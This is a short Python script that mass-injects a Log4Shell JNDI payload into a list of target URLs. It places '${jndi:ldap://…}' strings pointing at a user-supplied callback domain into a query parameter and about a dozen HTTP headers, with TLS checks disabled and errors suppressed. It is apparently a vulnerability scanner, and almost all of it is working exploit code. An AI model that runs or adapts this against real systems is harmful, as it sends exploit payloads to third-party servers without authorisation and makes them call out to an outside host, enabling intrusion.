from sys import argv
import requests
from time import sleep
import urllib3

urllib3.disable_warnings()

# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

if len(argv) > 1:
    urlFile = open(argv[1], 'r')
    urls = urlFile.readlines()
    count = 0
    for url in urls:
        try:
            count += 1
            payload = '${jndi:ldap://' + str(count) + '.' + argv[2] + '/a}'
            params = {'id':payload}
            headers = {'User-Agent':payload, 'Referer':payload, 'CF-Connecting_IP':payload, 'True-Client-IP':payload, 'X-Forwarded-For':payload, 'Originating-IP':payload, 'X-Real-IP':payload, 'X-Client-IP':payload, 'Forwarded':payload, 'Client-IP':payload, 'Contact':payload, 'X-Wap-Profile':payload, 'From':payload}
            url = url.strip()
            print('[{}] Testing {}'.format(count, url))
            requests.get(url, headers=headers, params=params, verify=False, timeout=10)
        except:
            pass
        sleep(0.3)
else:
    print('[!] Syntax: python3 {} <urlList> <collab>'.format(argv[0]))
